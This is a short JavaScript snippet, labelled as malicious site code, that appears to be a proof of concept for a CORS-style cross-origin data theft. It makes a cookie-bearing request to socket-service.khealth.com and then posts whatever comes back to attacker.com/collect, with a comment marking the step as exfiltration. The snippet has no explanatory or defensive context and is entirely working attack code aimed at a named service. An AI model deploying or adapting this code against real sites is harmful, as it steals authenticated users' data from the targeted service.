// Malicious site JavaScript
fetch('https://socket-service.khealth.com', {
    method: 'GET',
    credentials: 'include', // Include cookies in the request
    headers: {
        'Origin': 'http://malicious.com'
    }
}).then(response => response.text())
  .then(data => {
      // Exfiltrate the response data
      fetch('https://attacker.com/collect', {
          method: 'POST',
          body: JSON.stringify({ data: data }),
          headers: {
              'Content-Type': 'application/json'
          }
      });
  });
